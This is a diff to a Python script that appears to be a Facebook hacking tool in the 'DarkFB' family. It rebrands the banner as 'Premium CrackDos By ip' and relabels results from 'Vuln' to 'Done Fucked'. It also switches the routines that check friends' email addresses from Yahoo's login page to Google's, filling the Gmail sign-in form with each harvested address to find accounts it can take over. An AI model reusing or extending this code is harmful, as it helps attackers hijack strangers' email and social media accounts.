@@ -33,7 +33,7 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
+logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●●\n \x1b[1;92m█ \x1b[1;93m▼▼XXxXxXxXxXxXx  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium CrackDos By ip\n \x1b[1;92m█⚠️████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m █⚠️█\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m  BAÏEN \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92m🇮🇶\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92m🇮🇶\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] DARKFb BY BAÏEN :) \n'
 
 def tik():
     titik = [
@@ -62,8 +62,8 @@ reaksigrup = []
 komen = []
 komengrup = []
 listgrup = []
-vulnot = '\x1b[31mNot Vuln'
-vuln = '\x1b[32mVuln'
+vulnot = '\x1b[31mNot Hacked ❗️'
+vuln = '\x1b[32mDone Fucked ✅'
 
 
 def login():
@@ -876,8 +876,8 @@ def yahoofriends():
             mail = z['email']
             yahoo = re.compile('@.*')
             otw = yahoo.search(mail).group()
-            if 'yahoo.com' in otw:
-                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            if 'gmail.com' in otw:
+                br.open('https://accounts.google.com/ServiceLogin?service=mail&passive=1209600&osid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F494%2Fcontinue%2F%3Flogin%3D1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F494%2Fcontinue%2F%3Flogin%3D1&btmpl=mobile&ltmpl=mobile&flowName=GlifWebSignIn&flowEntry=ServiceLogin#mn')
                 br._factory.is_html = True
                 br.select_form(nr=0)
                 br['username'] = mail
@@ -944,8 +944,8 @@ def yahoolist():
         mpsh.append(jml)
         yahoo = re.compile('@.*')
         otw = yahoo.search(mail).group()
-        if 'yahoo.com' in otw:
-            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+        if 'gmail.com' in otw:
+            br.open('https://accounts.google.com/ServiceLogin?service=mail&passive=1209600&osid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F494%2Fcontinue%2F%3Flogin%3D1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F494%2Fcontinue%2F%3Flogin%3D1&btmpl=mobile&ltmpl=mobile&flowName=GlifWebSignIn&flowEntry=ServiceLogin#mn')
             br._factory.is_html = True
             br.select_form(nr=0)
             br['username'] = mail
@@ -2201,4 +2201,3 @@ def gaz(toket, enable=True):
 
 if __name__ == '__main__':
 	login()
-
